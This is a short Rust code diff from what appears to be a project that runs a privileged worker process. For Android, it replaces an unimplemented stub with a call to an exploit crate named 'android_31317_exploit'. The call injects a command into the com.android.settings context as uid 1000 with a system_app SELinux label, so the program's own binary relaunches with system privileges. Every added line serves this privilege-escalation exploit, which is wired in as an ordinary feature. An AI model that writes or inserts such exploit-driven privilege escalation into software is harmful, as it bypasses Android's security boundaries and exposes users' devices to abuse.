@@ -64,8 +64,25 @@ impl WorkerProcess {
     /// Spawn a remote process to act as the system worker
     #[cfg(target_os = "android")]
     pub async fn spawn() -> Result<()> {
-        // TODO: Add support for nice_name
-        unimplemented!()
+        use android_31317_exploit::exploit::{ExploitKind, TriggerApp, build_and_execute};
+        use std::env;
+
+        let path = env::current_exe()?;
+
+        build_and_execute(
+            1000,
+            "/data/",
+            "com.android.settings",
+            "platform:system_app:targetSdkVersion=29:complete",
+            &ExploitKind::Command(format!("{} worker", path.display())),
+            &TriggerApp::new(
+                "com.android.settings".into(),
+                "com.android.settings.Settings".into(),
+            ),
+            None,
+        )?;
+
+        Ok(())
     }
 
     /// Spawn a remote process to act as the system worker
